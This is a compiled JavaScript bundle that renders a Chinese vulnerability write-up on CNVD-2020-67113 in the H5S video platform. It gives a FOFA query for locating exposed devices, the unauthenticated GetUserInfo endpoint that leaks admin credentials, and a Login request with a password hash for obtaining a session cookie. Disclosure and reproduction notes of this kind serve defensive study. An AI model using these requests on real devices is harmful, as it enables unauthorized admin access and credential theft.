(window.webpackJsonp=window.webpackJsonp||[]).push([[56],{1884:function(a,s,t){a.exports=t.p+"assets/img/1636073252475-8f3cb570-d930-46e3-b8a6-0a686773c84a.8dd09b77.png"},1885:function(a,s,t){a.exports=t.p+"assets/img/1636074612323-f1fee2de-e43f-4842-9e03-8066f9a1b7fc.372ccad3.png"},1886:function(a,s,t){a.exports=t.p+"assets/img/1636073746405-1adf993c-1e08-461a-9f7f-a3ab07f969ad.d0b254b2.png"},1887:function(a,s,t){a.exports=t.p+"assets/img/1636073812938-d82c758c-891a-40aa-9e17-037339b99765.6f63abae.png"},1888:function(a,s,t){a.exports=t.p+"assets/img/1636073852540-6758c6d5-f945-4aec-8c53-53328c3cbc7d.837bdc0e.png"},2390:function(a,s,t){"use strict";t.r(s);var e=t(75),r=Object(e.a)({},(function(){var a=this,s=a.$createElement,e=a._self._c||s;return e("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[e("h1",{attrs:{id:"零视科技-h5s视频平台-getuserinfo-信息泄漏漏洞-cnvd-2020-67113"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#零视科技-h5s视频平台-getuserinfo-信息泄漏漏洞-cnvd-2020-67113"}},[a._v("#")]),a._v(" 零视科技 H5S视频平台 GetUserInfo 信息泄漏漏洞  CNVD-2020-67113")]),a._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),e("p",[a._v("零视技术(上海)有限公司是以领先的视频技术服务于客户，致力于物联网视频开发简单化，依托于HTML5 WebRTC 等新的技术，实现全平台视频播放简单化。\n零视技术(上海)有限公司H5S CONSOLE存在未授权访问漏洞。攻击者可利用漏洞访问后台相应端口，执行未授权操作。")]),a._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),e("a-checkbox",{attrs:{checked:""}},[a._v("零视科技 H5S视频平台")]),e("br"),a._v(" "),e("h2",{attrs:{id:"fofa"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#fofa"}},[a._v("#")]),a._v(" FOFA")]),a._v(" "),e("a-checkbox",{attrs:{checked:""}},[a._v('title="H5S视频平台|WEB"')]),e("br"),a._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),e("p",[a._v("登录页面")]),a._v(" "),e("p",[e("img",{attrs:{src:t(1884),alt:"img"}})]),a._v(" "),e("p",[a._v("API文档可以未授权访问")]),a._v(" "),e("div",{staticClass:"language-php line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-php"}},[e("code",[e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("/")]),a._v("doc"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("/")]),a._v("api"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(".")]),a._v("html\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:t(1885),alt:"img"}})]),a._v(" "),e("p",[a._v("存在用户账号密码泄漏的接口")]),a._v(" "),e("div",{staticClass:"language-php line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-php"}},[e("code",[e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("/")]),a._v("api"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("/")]),a._v("v1"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("/")]),a._v("GetUserInfo"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("?")]),a._v("user"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("admin"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("&")]),a._v("session"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:t(1886),alt:"img"}})]),a._v(" "),e("p",[a._v("其中登录接口中 Password为接口中存在的账号密码，可以直接发送请求获取Cookie")]),a._v(" "),e("div",{staticClass:"language-php line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-php"}},[e("code",[e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("/")]),a._v("api"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("/")]),a._v("v1"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("/")]),a._v("Login"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("?")]),a._v("user"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("admin"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("&")]),a._v("password"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),e("span",{pre:!0,attrs:{class:"token number"}},[a._v("02")]),a._v("ed400b8d9289f311fc1d68a83fdaaa\n")])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:t(1887),alt:"img"}})]),a._v(" "),e("p",[a._v("请求成功后访问主页面")]),a._v(" "),e("p",[e("img",{attrs:{src:t(1888),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=r.exports}}]);